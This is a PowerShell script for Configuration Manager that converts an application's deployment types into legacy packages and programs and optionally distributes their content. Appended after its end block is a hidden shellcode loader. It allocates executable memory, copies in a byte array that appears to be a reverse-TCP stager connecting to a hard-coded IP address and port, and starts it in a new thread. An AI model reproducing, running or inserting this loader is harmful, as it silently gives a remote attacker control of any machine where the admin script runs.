



[CmdletBinding()]
param (
	[Parameter(Mandatory,
			   ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$ApplicationName,
	[string]$PackageName,
	[switch]$SkipRequirements,
	[switch]$DistributeContent,
	[switch]$OsdFriendlyPowershellSyntax,
	[array]$AdditionalOptions = @(@{'Package' = @{ 'PkgFlags' = '128' } }),
	[string]$SiteServer = 'CONFIGMANAGER',
	[string]$SiteCode = 'UHP'
)

begin {
	try {
		
		
		
		
		function New-SupportedOsObject([Microsoft.SystemsManagementServer.DesiredConfigurationManagement.Rules.Rule]$OsRequirement) {
			$SupportedPlatforms = Get-WmiObject -ComputerName $SiteServer -Class SMS_SupportedPlatforms -Namespace "root\sms\site_$SiteCode"
			$SupportedOs = @()
			
			if ($OsRequirement.Expression.Operator.OperatorName -eq 'OneOf') {
				$AppOsList = $OsRequirement.Expression.Operands.RuleId
			} elseif ($OsRequirement.Expression.Operator.OperatorName -eq 'NoneOf') {
				
				
				return $false
			}
			foreach ($AppOs in $AppOsList) {
				foreach ($OsDetail in $SupportedPlatforms) {
					if ($AppOs -eq $OsDetail.CI_UniqueId) {
						$instance = ([wmiclass]("\\$SiteServer\root\sms\site_$SiteCode`:SMS_OS_Details")).CreateInstance()
						if ($instance -is [System.Management.ManagementBaseObject]) {
							$instance.MaxVersion = $OsDetail.OSMaxVersion
							$instance.MinVersion = $OsDetail.OSMinVersion
							$instance.Name = $OsDetail.OSName
							$instance.Platform = $OsDetail.OSPlatform
							$SupportedOs += $instance
						}
					}
				}
			}
			$SupportedOs
		}
		
		function Convert-NalPathToName ($NalPath) {
			$NalPath.Split('\\')[2].Split('.')[0]
		}
		
		function Get-DpsinDpGroup ($GroupId) {
			$Dps = Get-WmiObject @SiteServerWmiProps -Class SMS_DPGroupMembers -Filter "GroupID = '$GroupId'"
			if ($Dps) {
				$Dps.DPNALPath | foreach { Convert-NalPathToName $_ }
			} else {
				$false
			}
		}
		
		if (!(Test-Path "$(Split-Path $env:SMS_ADMIN_UI_PATH -Parent)\ConfigurationManager.psd1")) {
			throw 'Configuration Manager module not found.  Is the admin console intalled?'
		} elseif (!(Get-Module 'ConfigurationManager')) {
			Import-Module "$(Split-Path $env:SMS_ADMIN_UI_PATH -Parent)\ConfigurationManager.psd1"
		}
		$Location = (Get-Location).Path
		Set-Location "$($SiteCode):"
		
		$Application = Get-CMApplication -Name $ApplicationName
		if (!$Application) {
			throw "$ApplicationName not found"
		}
		$ApplicationXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::DeserializeFromString($Application.SDMPackageXML)
		
		$SetProgramProps = @{ }
		
		$SiteServerWmiProps = @{
			'Computername' = $SiteServer;
			'Namespace' = "root\sms\site_$SiteCode"
		}
		
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}
process {
	try {
		$DeploymentTypes = $ApplicationXML.DeploymentTypes
		
		for ($i = 0; $i -lt $DeploymentTypes.Count; $i++) {
			if ($DeploymentTypes.Count -gt 1) {
				$PackageName = "$ApplicationName - $($ApplicationXML.DeploymentTypes[$i].Title)"
			} elseif (!$PackageName) {
				$PackageName = $ApplicationName
			}
			$ProgramName = $ApplicationXML.DeploymentTypes[$i].Title
			
			if (Get-CMPackage -Name $PackageName) {
				throw "$PackageName already exists"
			}
			
			$PackageProps = @{
				'Name' = $PackageName;
				'Version' = $ApplicationXML.SoftwareVersion;
				'Manufacturer' = $ApplicationXML.Publisher;
				'Path' = $ApplicationXML.DeploymentTypes[$i].Installer.Contents.Location;
			}
			
			
			
			$NewProgramProps = @{
				'StandardProgramName' = $ProgramName;
				'PackageName' = $PackageName;
				'RunType' = [Microsoft.ConfigurationManagement.Cmdlets.AppModel.Commands.RunType]::($ApplicationXML.DeploymentTypes[$i].Installer.UserInteractionMode)
			}
			
			$AppCmdLine = $ApplicationXML.DeploymentTypes[$i].Installer.InstallCommandLine
			
			if ($OsdFriendlyPowershellSyntax.IsPresent -and ($AppCmdLine -match '.ps1$')) {
				$NewProgramProps.CommandLine = "powershell.exe -ExecutionPolicy bypass -NoProfile -NoLogo -NonInteractive -File $AppCmdLine"
			} else {
				$NewProgramProps.CommandLine = $ApplicationXML.DeploymentTypes[$i].Installer.InstallCommandLine
			}
			
			$SetProgramProps = @{
				'EnableTaskSequence' = $true;
				'StandardProgramName' = $ProgramName;
				'Name' = $PackageName;
			}
			
			
			
			
			$Duration = $ApplicationXML.DeploymentTypes[$i].Installer.MaxExecuteTime
			if ($Duration -eq 15) {
				$Duration = $Duration + 1
			} elseif ($Duration -eq 720) {
				$Duration = $Duration - 1
			}
			$NewProgramProps.Duration = $Duration
			
			if (!$SkipRequirements.IsPresent) {
				$Requirements = $ApplicationXML.DeploymentTypes[$i].Requirements
				$RequirementExpressions = $Requirements.Expression
				$FreeSpaceRequirement = $RequirementExpressions | where { ($_.Operands.LogicalName -contains 'FreeDiskSpace') -and ($_.Operator.OperatorName -eq 'GreaterEquals') }
				if ($FreeSpaceRequirement) {
					$NewProgramProps.DiskSpaceRequirement = $FreeSpaceRequirement.Operands.value / 1MB
					$NewProgramProps.DiskSpaceUnit = 'MB'
				}
			}
			
			switch ($ApplicationXML.DeploymentTypes[$i].Installer.RequiresLogon) {
				$false {
					$NewProgramProps.ProgramRunType = 'OnlyWhenNoUserIsLoggedOn'
				}
				$true {
					$NewProgramProps.ProgramRunType = 'OnlyWhenUserIsLoggedOn'
				}
				default {
					$NewProgramProps.ProgramRunType = 'WhetherOrNotUserIsLoggedOn'
				}
			}
			
			if ($ApplicationXML.DeploymentTypes[$i].Installer.UserInteractionMode -eq 'Hidden') {
				$SetProgramProps['SuppressProgramNotifications'] = $true
			}
			
			if ($ApplicationXML.DeploymentTypes[$i].Installer.SourceUpdateCode) {
				
			}
			
			$PostIntallBehavior = $ApplicationXML.DeploymentTypes[$i].Installer.PostInstallBehavior
			if (($PostIntallBehavior -eq 'BasedOnExitCode') -or ($PostIntallBehavior -eq 'NoAction')) {
				$SetProgramProps.AfterRunningType = 'NoActionRequired'
			} elseif ($PostIntallBehavior -eq 'ProgramReboot') {
				$SetProgramProps.AfterRunningType = 'ProgramControlsRestart'
			} elseif ($PostIntallBehavior -eq 'ForceReboot') {
				$SetProgramProps.AfterRunningType = 'ConfigurationManagerRestartsComputer'
			}
			
			$NewPackage = New-CMPackage @PackageProps
			Write-Verbose "Successfully created package name $($NewPackage.Name) ($($NewPackage.PackageID))"
			$NewProgram = New-CMProgram @NewProgramProps
			Set-CMProgram @SetProgramProps
			
			if (!$SkipRequirements.IsPresent) {
				$OsRequirement = $Requirements | where { $_.Expression -is [Microsoft.SystemsManagementServer.DesiredConfigurationManagement.Expressions.OperatingSystemExpression] }
				if ($OsRequirement) {
					$SupportedOs = New-SupportedOsObject $OsRequirement
					$NewProgram.SupportedOperatingSystems = $SupportedOs
					$NewProgram.Put()
				}
			}
			
			if ($AdditionalOptions) {
				$AdditionalOptions | foreach {
					$_.GetEnumerator() | foreach {
						if ($_.Key -eq 'Package') {
							$_.Value.GetEnumerator() | foreach {
								$NewPackage.($_.Key) = $_.Value
								$NewPackage.Put()
							}
						} elseif ($_.Key -eq 'Program') {
							$_.Value.GetEnumerator() | foreach {
								$NewProgram.($_.Key) = $_.Value
								$NewProgram.Put()
							}
						}
					}
				}
			}
			
			if ($DistributeContent.IsPresent) {
				
				$AllDpGroupPackages = Get-WmiObject @SiteServerWmiProps -Class SMS_DPGroupPackages
				$AllDpGroups = Get-WmiObject @SiteServerWmiProps -Class SMS_DistributionPointGroup
				
				
				$AppDpGroupId = ($AllDpGroupPackages | where { $_.PkgID -eq $Application.PackageID } | Group-Object GroupId).Name
				$AppDpGroup = $AllDpGroups | where { $_.GroupID -eq $AppDpGroupId}
				if ($AppDpGroup) {
					Write-Verbose "Application is in a DP group"
					Start-CMContentDistribution -DistributionPointGroupName $AppDpGroup.Name -PackageName $PackageName
					$DpsInAppDpGroup = Get-DpsinDpGroup $AppDpGroupId
					$SingleDps = Get-WmiObject @SiteServerWmiProps -Class SMS_DistributionPoint -Filter "SecureObjectID = '$($Application.ModelName)'" | where { $DpsInAppDpGroup -notcontains (Convert-NalPathToName $_.ServerNALPath) }
				} else {
					$SingleDps = Get-WmiObject @SiteServerWmiProps -Class SMS_DistributionPoint -Filter "SecureObjectID = '$($Application.ModelName)'"
				}

				if ($SingleDps) {
					Write-Verbose "Application is in $($SingleDps.Count) single DPs"
					foreach ($Dp in $SingleDps) {
						$DpName = Convert-DpNalPathToName $Dp.ServerNALPath
						Write-Verbose "Adding package '$PackageName' to DP '$DpName'"
						Start-CMContentDistribution -DistributionPoint $DpName -PackageName $PackageName
					}
				}
			}
			Unlock-CMObject $NewPackage
		}
		
	} catch {
		Write-Error "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
	}
}

end {
	Set-Location $Location
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x7c,0xf1,0x11,0xba,0x68,0x02,0x00,0x09,0xdd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

